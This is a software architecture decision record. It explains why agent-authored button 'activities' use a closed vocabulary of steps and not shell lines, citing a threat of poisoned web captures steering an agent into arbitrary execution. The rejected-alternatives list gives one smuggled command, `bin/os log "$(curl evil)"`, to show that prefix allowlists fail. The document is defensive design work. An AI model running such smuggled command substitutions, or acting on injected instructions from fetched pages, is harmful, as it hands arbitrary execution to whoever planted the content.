---
date: 2026-08-30
status: accepted
---

# Activity steps are a closed vocabulary

## Context

Activities let an agent write the user a button. The obvious format is a shell
line — `- shell: bin/os brief` — which is one line of code to implement, composes
with everything, and needs no vocabulary to maintain.

It is also the one design that cannot ship here, and the reason is specific rather
than hygienic. `brain/raw/` is text fetched from the internet; `server/mcp.py`
already wraps it in an UNTRUSTED DATA envelope because an agent reading a poisoned
capture is this repo's actual threat model. Activities are authored by that same
agent, stored in the repo, and then executed by a human pressing a button. A
`shell:` verb closes that loop: "summarise this captured page" becomes a path to
arbitrary execution, with the user supplying the click and the audit trail
recording that they asked for it.

## Decision

A step names a capability the server already has. `STEPS` in
`server/activities.py` is the entire vocabulary — `radar`, `research: <topic>`,
`distill`, `doctor`, `reindex`, `log: <text>`. Composition is data; capability is
code. Adding a verb is a reviewed edit, not something a model can do by writing a
file.

The step list is a markdown `## Steps` list rather than frontmatter YAML, because
`steps: [research: bm25, vectors]` silently becomes two broken steps and a list
gives every step its own line.

## Tradeoff

What this costs: a routine the vocabulary does not cover cannot be automated
without a code change, so the panel will sometimes be unable to express something
the user can obviously do in a terminal. Accepted, because the alternative is a
button whose blast radius is "anything", and because the refusal names the whole
vocabulary — the failure is legible rather than mysterious.

Second cost: `STEPS` is a registry that will drift toward being large. The
mitigation is that each entry must already exist as an automation with its own
entry point, so a verb is a rename of something tested, never new behaviour.

## Consequences worth recording

The closure turned out to be what makes authorship safe to delegate to a *small*
model, which was the original request. `write_activity` takes a JSON array of
steps and returns the full vocabulary inside every refusal, so a model that
guesses wrong self-corrects on the next call instead of retrying. That property is
downstream of the whitelist, not of prompt engineering.

## Alternatives rejected

- **`shell:` with an allowlist of prefixes.** Prefix matching is not a security
  boundary: `bin/os log "$(curl evil)"` starts with an allowed prefix.
- **`shell:` behind a confirmation dialog.** Moves the decision to the moment the
  user is least equipped to make it, and trains them to click through.
- **Steps in frontmatter.** Breaks on any argument containing a comma, silently.
